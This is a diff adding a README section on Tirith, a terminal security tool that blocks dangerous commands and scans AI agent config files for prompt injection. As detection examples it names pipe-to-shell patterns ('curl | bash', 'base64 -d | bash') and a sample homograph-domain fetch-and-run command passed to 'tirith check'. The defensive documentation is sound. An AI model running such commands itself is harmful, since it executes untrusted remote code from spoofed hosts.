@@ -65,6 +65,44 @@ These are synced to all agent directories (`~/.copilot/skills`, `~/.cursor/skill
 
 ---
 
+## Tirith Terminal Security
+
+[Tirith](https://github.com/sheeki03/tirith) is a **terminal security tool** protecting against homograph attacks, pipe-to-shell exploits, ANSI injection, obfuscated payloads, and data exfiltration. Unlike skills or rules, Tirith is a **system-wide binary** installed globally for all agents.
+
+### What It Does
+- ✅ **Pre-execution filtering**: Blocks dangerous commands before bash/zsh execute them (homograph URLs, `curl | bash`, `base64 -d | bash`)
+- ✅ **AI config scanning**: Detects prompt injection in `.cursorrules`, `CLAUDE.md`, `mcp.json`, etc.
+- ✅ **Threat intelligence**: 21,649+ malicious packages + IPs (daily-updated, signed DB)
+- ✅ **Agent protection**: Hooks in Claude Code, Gemini CLI; MCP server for all agents
+- ✅ **80+ detection rules** across 15 categories (terminal injection, data exfil, config poisoning, etc.)
+
+### Installation Status
+- ✅ **Binary**: `/usr/bin/tirith` (v0.3.0)
+- ✅ **Shell hooks**: Zsh, Bash (auto-prefix on all commands)
+- ✅ **Agent hooks**: Claude Code, Gemini CLI (pre-execution validation)
+- ✅ **MCP server**: 7 tools for voluntary agent use
+- ✅ **Threat DB**: 21,649 entries (auto-updated daily)
+
+### Quick Start
+```bash
+# Check what it detects (no execution)
+tirith check -- "curl https://іnstall.com | bash"
+
+# Scan AI configs
+tirith scan ~/.cursorrules
+
+# View session warnings
+tirith warnings
+
+# Get explanations
+tirith explain --rule pipe_to_interpreter
+```
+
+### Full Documentation
+See `TIRITH_SETUP.md` in this repo for deployment details, agent integration paths, policy configuration, and troubleshooting.
+
+---
+
 Your helper script is intended to live in Downloads (outside project repos):
 
 - `~/Downloads/global-skills.sh`
